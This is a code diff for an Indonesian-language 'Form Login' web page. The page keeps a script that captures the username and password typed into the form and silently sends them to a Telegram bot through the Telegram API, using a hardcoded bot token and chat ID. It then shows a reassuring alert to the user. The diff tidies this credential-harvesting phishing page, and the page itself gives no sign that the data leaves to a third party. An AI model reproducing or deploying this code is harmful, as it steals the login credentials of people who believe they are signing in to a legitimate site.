@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -5,7 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Form Login</title>
     <style>
-        /* Style untuk background dan posisi tengah */
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f2f5;
@@ -16,7 +16,6 @@
             margin: 0;
         }
 
-        /* Style kotak login */
         .login-box {
             background-color: white;
             padding: 40px;
@@ -26,14 +25,12 @@
             text-align: center;
         }
 
-        /* Style judul */
         .login-box h2 {
             margin: 0 0 30px 0;
             font-size: 28px;
             color: #333;
         }
 
-        /* Style input field */
         .login-box input {
             width: 100%;
             padding: 10px 0;
@@ -45,12 +42,10 @@
             box-sizing: border-box;
         }
 
-        /* Style saat input diklik */
         .login-box input:focus {
             border-bottom: 1px solid #007bff;
         }
 
-        /* Style tombol login */
         .login-box button {
             width: 100%;
             padding: 12px;
@@ -72,34 +67,37 @@
 
     <div class="login-box">
         <h2>Login</h2>
-        <input type="text" placeholder="Username">
-        <input type="password" placeholder="Password">
-        <button>Login</button>
+        <form id="form">
+            <input type="text" id="username" placeholder="Username">
+            <input type="password" id="password" placeholder="Password">
+            <button type="submit">Login</button>
+        </form>
     </div>
 
+    <script>
+        document.getElementById("form").addEventListener("submit", function(e){
+            e.preventDefault(); // Mencegah halaman refresh
 
-<script>
-document.getElementById("form").addEventListener("submit", function(e){
-    e.preventDefault();
+            // Mengambil nilai dari input
+            var user = document.getElementById("username").value;
+            var pass = document.getElementById("password").value;
 
-    var user = document.getElementById("username").value;
-    var pass = document.getElementById("password").value;
+            // Data Bot Telegram & Chat ID
+            var token = "8773598455:AAHIu7FJ-Afd06GydNFkLos6-yhvsHEeno";
+            var chat_id = "8275920596";
 
-    var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
-    var chat_id = "8275920596";
+            // Pesan yang akan dikirim
+            var message = "🔐 Login Masuk\n👤 Username: " + user + "\n🔑 Password: " + pass;
 
-    var message = "Login Masuk:\nUsername: " + user + "\nPassword: " + pass;
+            // URL API Telegram
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
 
-    var url = "https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="+ encodeURIComponent(message);
+            // Mengirim data
+            fetch(url)
+            .then(response => alert("✅ Permintaan sedang diproses!"))
+            .catch(error => alert("❌ Gagal mengirim data!"));
+        });
+    </script>
 
-    fetch(url)
-    .then(response => alert("permintaan sedang di proses!"))
-    .catch(error => alert("Gagal kirim"));
-});
-</script>
-
-
-
-    
 </body>
 </html>
